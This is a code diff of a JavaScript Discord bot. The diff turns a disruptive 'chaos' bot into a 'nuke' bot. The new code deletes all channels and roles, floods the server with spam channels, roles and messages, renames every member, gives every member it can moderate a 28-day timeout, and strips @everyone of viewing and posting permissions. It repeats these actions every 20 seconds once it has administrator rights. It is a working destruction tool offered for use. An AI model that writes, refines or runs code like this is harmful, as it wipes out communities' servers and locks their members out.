@@ -12,63 +12,45 @@ const client = new Client({
   ],
 });
 
-// ================== LEVEL 1000 CONFIG ==================
+// ================== CONFIG ==================
 const TOKEN = process.env.TOKEN;
 const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
-const CHAOS_INTERVAL = Number(process.env.CHAOS_INTERVAL) || 35 * 1000; // 35 seconds
-const MAX_ACTIONS_PER_TICK = Number(process.env.MAX_ACTIONS_PER_TICK) || 14;
+const CHAOS_INTERVAL = Number(process.env.CHAOS_INTERVAL) || 20 * 1000; // 20 seconds
+const MAX_ACTIONS_PER_TICK = Number(process.env.MAX_ACTIONS_PER_TICK) || 18;
+
+// Optional: channel that will never be deleted
+const PROTECTED_CHANNEL = 'aaaaaaaa';
 
 if (!TOKEN) {
   console.error('❌ TOKEN is missing!');
   process.exit(1);
 }
 
-// ================== CHAOS LISTS ==================
+// ================== LISTS ==================
 const SERVER_NAMES = [
-  'LEVEL 1000 CHAOS', 'THE SERVER IS DYING', 'NO ESCAPE', 'EVERYTHING IS BURNING',
-  'BOT IS SENTIENT', 'YOU ASKED FOR THIS', 'FINAL STAGE', 'TOTAL COLLAPSE',
-  'THE VOID WON', 'ADMIN IS CRYING', 'CHAOS INCARNATE', 'GOODBYE SANITY',
-  'I OWN THIS PLACE', 'ERROR 1000', 'THE END IS NOW', 'HELP IS NOT COMING'
+  'NUKED', 'GET NUKED', 'SERVER DESTROYED', 'OWNED', 'RIP SERVER',
+  'CHAOS WON', 'NO SURVIVORS', 'THE END', 'BOT OWNS THIS', 'GOODBYE'
 ];
 
 const CHANNEL_NAMES = [
-  'the-abyss', 'screaming-void', 'please-help', 'pain-chamber', 'no-escape',
-  'level-1000', 'total-destruction', 'bot-playground', 'cursed-zone', 'void-whispers',
-  'admin-tears', 'final-destination', 'chaos-spawn', 'we-are-lost', 'delete-me',
-  'suffering', 'the-pit', 'last-chance', 'everything-hurts', 'no-hope',
-  'burning-alive', 'mental-breakdown', 'server-corpse', 'chaos-overflow'
-];
-
-const VOICE_NAMES = [
-  'screaming-chamber', 'void-echoes', 'the-pit', 'pain-room', 'no-return',
-  'level-1000-vc', 'final-vc', 'suffering-vc', 'bot-listening', 'cursed-hangout',
-  'death-chamber', 'last-voice'
+  'nuked', 'destroyed', 'get-fucked', 'no-escape', 'owned',
+  'rip', 'chaos', 'void', 'pain', 'end', 'dead-server',
+  'bot-was-here', 'lmao', 'gg', 'destroyed-by-bot'
 ];
 
 const NICKNAMES = [
-  'LEVEL 1000 VICTIM', 'I REGRET EVERYTHING', 'PLEASE END THIS', 'BOT PROPERTY',
-  'NO HOPE LEFT', 'MENTALLY GONE', 'CHAOS SLAVE', 'VOID TOUCHED', 'HELP ME',
-  'SERVER CORPSE', 'THE DAMNED', 'ERROR 1000', 'FINAL FORM', 'BROKEN',
-  'OWNED BY BOT', 'SANITY: 0', 'WHY DID I JOIN', 'PAIN VESSEL'
+  'NUKED', 'OWNED', 'RIP', 'BOT PROPERTY', 'NO HOPE',
+  'GET FUCKED', 'SERVER CORPSE', 'VICTIM', 'DESTROYED'
 ];
 
 const ROLE_NAMES = [
-  'Chaos God', 'Void Walker', 'Level 1000 Victim', 'The Damned', 'Bot Property',
-  'No Hope', 'Eternal Suffering', 'Server Corpse', 'Final Role', 'Owned',
-  'Mental Collapse', 'Chaos Overflow', 'Do Not Keep'
+  'Nuked', 'Owned', 'Destroyed', 'No Hope', 'Bot Property', 'RIP'
 ];
 
 const MESSAGES = [
-  '**LEVEL 1000 CHAOS**', 'THE SERVER IS COLLAPSING', 'YOU WANTED THIS',
-  'NO MERCY', 'EVERYTHING IS GONE', 'I CONTROL ALL', 'GOOD LUCK',
-  'THE VOID IS HERE', 'ADMIN CANNOT SAVE YOU', 'THIS IS THE END',
-  'CHAOS HAS WON', 'FEEL THE PAIN', 'NO ESCAPE FROM LEVEL 1000',
-  'THE BOT IS ALIVE', 'BURN IT ALL'
-];
-
-const COLORS = [
-  Colors.Red, Colors.DarkRed, Colors.Purple, Colors.DarkPurple, Colors.Fuchsia,
-  Colors.Orange, Colors.Yellow, Colors.DarkButNotBlack, Colors.DarkerGrey
+  '**SERVER NUKED**', 'GET FUCKED', 'THIS SERVER IS DONE',
+  'NO SURVIVORS', 'OWNED BY THE BOT', 'GOODBYE', 'RIP',
+  'YOU CANNOT STOP THIS', 'THE END', 'NUKE LEVEL ACTIVATED'
 ];
 
 // ================== HELPERS ==================
@@ -79,214 +61,130 @@ function chance(percent) {
   return Math.random() * 100 < percent;
 }
 
-// ================== LEVEL 1000 ACTIONS ==================
-const chaosActions = [
-  // Server rename (very frequent)
+// ================== NUKE ACTIONS ==================
+const nukeActions = [
+  // Rename server
   async (guild) => {
-    await guild.setName(randomItem(SERVER_NAMES));
+    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
     console.log('🔥 Server renamed');
   },
 
-  // Description
+  // Delete channels (except protected)
   async (guild) => {
-    await guild.setDescription(randomItem([
-      'LEVEL 1000 CHAOS ACTIVE',
-      'This server is actively dying.',
-      'No one is safe.',
-      'The bot owns everything now.',
-      'You asked for Level 1000.',
-      null
-    ]));
+    const channels = [...guild.channels.cache.values()];
+    for (const channel of channels) {
+      if (channel.name === PROTECTED_CHANNEL) continue;
+      await channel.delete('NUKE').catch(() => {});
+    }
+    console.log('🗑️ Channels deleted');
   },
 
-  // Heavy channel rename + settings
+  // Create spam channels
   async (guild) => {
-    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.manageable);
-    if (!channels.size) return;
-    const channel = channels.random();
-    await channel.setName(randomItem(CHANNEL_NAMES));
-    await channel.setTopic(randomItem(['LEVEL 1000', 'No escape', 'The end', 'Pain', null]));
-    await channel.setRateLimitPerUser(Math.floor(Math.random() * 60));
-    if (chance(50)) await channel.setNSFW(true);
-  },
-
-  // Voice channel chaos
-  async (guild) => {
-    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice && c.manageable);
-    if (!channels.size) return;
-    const channel = channels.random();
-    await channel.setName(randomItem(VOICE_NAMES));
-    await channel.setUserLimit(Math.floor(Math.random() * 15));
-  },
-
-  // Create many temporary text channels
-  async (guild) => {
-    for (let i = 0; i < 3; i++) {
+    for (let i = 0; i < 5; i++) {
       const ch = await guild.channels.create({
         name: randomItem(CHANNEL_NAMES),
         type: ChannelType.GuildText,
-        topic: 'LEVEL 1000 temporary hell',
-      });
-      await ch.send(randomItem(MESSAGES)).catch(() => {});
-      setTimeout(() => ch.delete().catch(() => {}), (4 + Math.random() * 8) * 60 * 1000);
+      }).catch(() => null);
+      if (ch) {
+        await ch.send(randomItem(MESSAGES)).catch(() => {});
+      }
     }
-    console.log('✨ Created multiple text channels');
+    console.log('✨ Spam channels created');
   },
 
-  // Create voice channels
+  // Delete all roles
   async (guild) => {
-    for (let i = 0; i < 2; i++) {
-      const ch = await guild.channels.create({
-        name: randomItem(VOICE_NAMES),
-        type: ChannelType.GuildVoice,
-      });
-      setTimeout(() => ch.delete().catch(() => {}), (5 + Math.random() * 8) * 60 * 1000);
+    const roles = [...guild.roles.cache.values()];
+    for (const role of roles) {
+      if (role.id === guild.id) continue; // @everyone
+      if (!role.editable) continue;
+      await role.delete('NUKE').catch(() => {});
     }
+    console.log('🗑️ Roles deleted');
   },
 
-  // Mass nickname destruction
+  // Create spam roles
   async (guild) => {
-    const members = await guild.members.fetch();
-    const targets = [...members.filter(m => !m.user.bot && m.manageable).values()]
-      .sort(() => 0.5 - Math.random())
-      .slice(0, 12);
-    for (const m of targets) {
-      await m.setNickname(randomItem(NICKNAMES)).catch(() => {});
-    }
-    console.log(`👤 Destroyed ${targets.length} nicknames`);
-  },
-
-  // Role chaos
-  async (guild) => {
-    const roles = guild.roles.cache.filter(r => r.editable && r.id !== guild.id);
-    if (!roles.size) return;
-    const role = roles.random();
-    await role.setName(randomItem(ROLE_NAMES));
-    await role.setColor(randomItem(COLORS));
-  },
-
-  // Create many temporary roles
-  async (guild) => {
-    for (let i = 0; i < 3; i++) {
-      const role = await guild.roles.create({
+    for (let i = 0; i < 4; i++) {
+      await guild.roles.create({
         name: randomItem(ROLE_NAMES),
-        color: randomItem(COLORS),
-        reason: 'LEVEL 1000',
-      });
-      setTimeout(() => role.delete().catch(() => {}), (6 + Math.random() * 10) * 60 * 1000);
+        color: Colors.Red,
+        reason: 'NUKE',
+      }).catch(() => {});
     }
   },
 
-  // Mass role spam
+  // Mass nickname
   async (guild) => {
-    const members = await guild.members.fetch();
-    const humans = [...members.filter(m => !m.user.bot && m.manageable).values()];
-    const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
-    if (!humans.length || !roles.length) return;
-
-    for (let i = 0; i < 10; i++) {
-      const member = randomItem(humans);
-      const role = randomItem(roles);
-      if (chance(60)) await member.roles.add(role).catch(() => {});
-      else await member.roles.remove(role).catch(() => {});
+    const members = await guild.members.fetch().catch(() => null);
+    if (!members) return;
+    for (const member of members.values()) {
+      if (member.user.bot || !member.manageable) continue;
+      await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
     }
-    console.log('🎭 Mass role chaos');
+    console.log('👤 Mass nicknames');
   },
 
-  // Voice move chaos
+  // Mass timeout
   async (guild) => {
-    const voiceChannels = [...guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice).values()];
-    if (voiceChannels.length < 2) return;
-    const members = await guild.members.fetch();
-    const inVoice = [...members.filter(m => m.voice.channel && m.manageable).values()];
-    for (const target of inVoice.slice(0, 6)) {
-      const newCh = randomItem(voiceChannels.filter(c => c.id !== target.voice.channelId));
-      await target.voice.setChannel(newCh).catch(() => {});
+    const members = await guild.members.fetch().catch(() => null);
+    if (!members) return;
+    for (const member of members.values()) {
+      if (member.user.bot || !member.moderatable) continue;
+      await member.timeout(28 * 24 * 60 * 60 * 1000, 'NUKE').catch(() => {}); // 28 days
     }
+    console.log('⏳ Mass timeout');
   },
 
-  // Heavy timeouts
-  async (guild) => {
-    const members = await guild.members.fetch();
-    const targets = [...members.filter(m => !m.user.bot && m.moderatable).values()]
-      .sort(() => 0.5 - Math.random())
-      .slice(0, 6);
-    for (const m of targets) {
-      const seconds = [120, 300, 600, 900, 1800][Math.floor(Math.random() * 5)];
-      await m.timeout(seconds * 1000, 'LEVEL 1000').catch(() => {});
-    }
-    console.log('⏳ Mass timeouts');
-  },
-
-  // Extreme message spam
+  // Spam messages
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
     );
-    if (!channels.size) return;
-
-    for (let i = 0; i < 5; i++) {
-      const channel = channels.random();
-      const msg = await channel.send(randomItem(MESSAGES)).catch(() => {});
-      if (msg) {
-        for (const e of ['🔥', '💀', '☠️', '💣', '👁️', '🩸'].sort(() => 0.5 - Math.random()).slice(0, 4)) {
-          await msg.react(e).catch(() => {});
-        }
+    for (const channel of channels.values()) {
+      for (let i = 0; i < 3; i++) {
+        await channel.send(randomItem(MESSAGES)).catch(() => {});
       }
     }
-    console.log('💬 Extreme spam');
+    console.log('💬 Mass spam');
+  },
+
+  // Permission destroy
+  async (guild) => {
+    const channels = guild.channels.cache.filter(c => c.manageable);
+    for (const channel of channels.values()) {
+      await channel.permissionOverwrites.edit(guild.roles.everyone, {
+        ViewChannel: false,
+        SendMessages: false,
+        Connect: false,
+      }).catch(() => {});
+    }
+    console.log('🔐 Permissions destroyed');
   },
 
   // Bot nickname
   async (guild) => {
-    await guild.members.me.setNickname(randomItem([
-      'LEVEL 1000', 'THE DESTROYER', 'SERVER OWNER', 'CHAOS GOD',
-      'NO MERCY', 'I AM INEVITABLE', 'YOUR END', 'VOID'
-    ])).catch(() => {});
-  },
-
-  // Create categories
-  async (guild) => {
-    for (let i = 0; i < 2; i++) {
-      const cat = await guild.channels.create({
-        name: randomItem(['LEVEL 1000', 'THE VOID', 'NO HOPE', 'FINAL ZONE', 'CHAOS']),
-        type: ChannelType.GuildCategory,
-      });
-      setTimeout(() => cat.delete().catch(() => {}), 10 * 60 * 1000);
-    }
-  },
-
-  // Aggressive permission chaos
-  async (guild) => {
-    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.manageable);
-    if (!channels.size) return;
-    for (let i = 0; i < 3; i++) {
-      const channel = channels.random();
-      await channel.permissionOverwrites.edit(guild.roles.everyone, {
-        ViewChannel: chance(40),
-        SendMessages: chance(30),
-      }).catch(() => {});
-    }
-    console.log('🔐 Permission destruction');
+    await guild.members.me.setNickname('NUKE BOT').catch(() => {});
   },
 ];
 
-// ================== MAIN LOOP ==================
-async function doChaos(guild) {
+// ================== MAIN ==================
+async function doNuke(guild) {
   if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
     console.log('⚠️ Missing Administrator permission');
     return;
   }
 
-  console.log(`\n======== LEVEL 1000 CHAOS on ${guild.name} ========`);
+  console.log(`\n======== NUKE LEVEL on ${guild.name} ========`);
 
-  const selected = [...chaosActions].sort(() => 0.5 - Math.random()).slice(0, MAX_ACTIONS_PER_TICK);
+  const selected = [...nukeActions].sort(() => 0.5 - Math.random()).slice(0, MAX_ACTIONS_PER_TICK);
 
   for (const action of selected) {
     try {
       await action(guild);
-      await new Promise(r => setTimeout(r, 400));
+      await new Promise(r => setTimeout(r, 300));
     } catch (err) {
       console.error('❌', err.message);
     }
@@ -295,14 +193,14 @@ async function doChaos(guild) {
 
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
-  console.log(`🔥 LEVEL 1000 ACTIVE | Every ${CHAOS_INTERVAL / 1000}s | ${MAX_ACTIONS_PER_TICK} actions`);
-  console.log('No mercy mode enabled.');
+  console.log(`💣 NUKE LEVEL ACTIVE | Every ${CHAOS_INTERVAL / 1000}s`);
+  console.log('This will destroy the server.');
 
   setInterval(async () => {
     const guild = TARGET_GUILD_ID
       ? client.guilds.cache.get(TARGET_GUILD_ID)
       : client.guilds.cache.first();
-    if (guild) await doChaos(guild);
+    if (guild) await doNuke(guild);
   }, CHAOS_INTERVAL);
 });
 
@@ -310,9 +208,9 @@ client.on('messageCreate', async (message) => {
   if (message.author.bot || !message.guild) return;
   if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
 
-  if (message.content === '!chaos') {
-    await message.reply('💥 **LEVEL 1000 UNLEASHED**');
-    await doChaos(message.guild);
+  if (message.content === '!nuke') {
+    await message.reply('💣 **NUKE LEVEL ACTIVATED**');
+    await doNuke(message.guild);
   }
 });
 
